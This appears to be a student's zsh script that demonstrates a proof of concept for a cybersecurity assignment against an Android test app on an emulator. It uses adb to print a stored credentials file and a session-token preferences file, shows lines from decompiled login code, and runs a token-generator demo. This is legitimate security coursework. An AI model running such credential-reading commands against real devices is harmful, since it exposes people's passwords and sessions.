#!/bin/zsh
clear
export ANDROID_SDK_ROOT=/Users/saatwik/android-sdk
export PATH=/Users/saatwik/android-sdk/platform-tools:$PATH
cd '/Users/saatwik/Desktop/Uni Stuff/USYD Y2 S1/Intro to cyber /Assignment1'
echo 'APK PoC: stored credentials and session token'
echo
echo '$ adb -s emulator-5554 shell cat /data/data/com.example.mastg_test0016/files/credentials.txt'
adb -s emulator-5554 shell cat /data/data/com.example.mastg_test0016/files/credentials.txt
sleep 2
echo
echo '$ adb -s emulator-5554 shell cat /data/data/com.example.mastg_test0016/shared_prefs/SessionPrefs.xml'
adb -s emulator-5554 shell cat /data/data/com.example.mastg_test0016/shared_prefs/SessionPrefs.xml
sleep 2
echo
echo '$ sed -n '\''174,190p'\'' decompiled/sources/com/example/mastg_test0016/Login.java'
sed -n '174,190p' decompiled/sources/com/example/mastg_test0016/Login.java
sleep 3
echo
echo '$ python3 submission_draft/pocs/token_generator_demo.py --seed 12345 --count 3'
python3 submission_draft/pocs/token_generator_demo.py --seed 12345 --count 3
sleep 4
